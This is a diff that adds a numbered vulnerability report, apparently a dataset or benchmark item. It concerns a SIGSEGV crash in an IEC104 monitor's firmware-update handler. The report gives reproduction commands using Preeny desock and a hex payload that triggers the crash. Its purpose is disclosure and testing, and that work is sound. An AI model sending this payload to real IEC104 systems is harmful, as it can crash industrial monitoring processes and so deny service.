@@ -1,0 +1,13 @@
+Number: 13
+
+Summarize:
+No affected version is specified. The report shows that `./test/iec104_monitor` in server mode crashes when it processes the supplied IEC104 input through Preeny `desock.so`. Under gdb, the observed failure is a SIGSEGV with execution at `0x0000000000000000`; the backtrace points to `Iec104_Deal_FirmUpdate` in `../IEC10X/Iec104.c:1129`, reached from `Iec104_Deal_I` and `Iex104_Receive`. The report does not identify the precise validation or root cause; the demonstrated impact is process termination.
+
+Reproduce:
+1. Build Preeny in the project tree: `cd ./preeny && make`.
+2. Prepare `./crash/crash_input_2` with the documented input data: `68e0 4000 0083 8068 1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0083 8000 08`.
+3. Run the monitor in server mode with Preeny desock preloaded: `LD_PRELOAD=./preeny/x86_64-linux-gnu/desock.so ./test/iec104_monitor -m server -n 1 < ./crash/crash_input_2`.
+4. Expected result: `iec104_monitor` crashes with SIGSEGV. Under gdb, Thread 2 reports `0x0000000000000000 in ?? ()`, and `backtrace` shows `Iec104_Deal_FirmUpdate` at `../IEC10X/Iec104.c:1129`, then `Iec104_Deal_I`, `Iex104_Receive`, and `Iec104_main`.
+
+Payload:
+68 e0 40 00 00 83 80 68 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 83 80 00 08
